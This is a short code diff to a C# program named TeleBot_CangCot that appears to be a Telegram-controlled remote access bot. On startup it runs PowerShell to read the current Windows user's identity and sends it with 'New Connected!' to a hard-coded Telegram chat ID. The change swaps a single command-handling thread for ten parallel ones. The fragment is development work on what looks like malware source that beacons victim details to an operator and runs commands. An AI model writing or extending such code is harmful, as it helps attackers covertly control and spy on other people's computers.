@@ -1,5 +1,6 @@
 ﻿using Newtonsoft.Json.Linq;
 using System;
+using System.Threading;
 using System.Collections.Specialized;
 using System.Diagnostics;
 using System.IO;
@@ -20,10 +21,23 @@ namespace TeleBot_CangCot
         static void Main(string[] args)
         {
             SendMessage("1146104261", "New Connected!", ExecuteCommand("powershell [System.Security.Principal.WindowsIdentity]::GetCurrent().Name"));
-            Thread runThread = new Thread(run);
+            /*Thread runThread = new Thread(run);
             runThread.Start();
 
-            runThread.Join();
+            runThread.Join();*/
+            Thread[] threads = new Thread[10]; 
+
+            for (int i = 0; i < threads.Length; i++)
+            {
+                threads[i] = new Thread(run);
+                threads[i].Start();
+            }
+
+            foreach (Thread thread in threads)
+            {
+                thread.Join();
+            }
+
         }
         
 
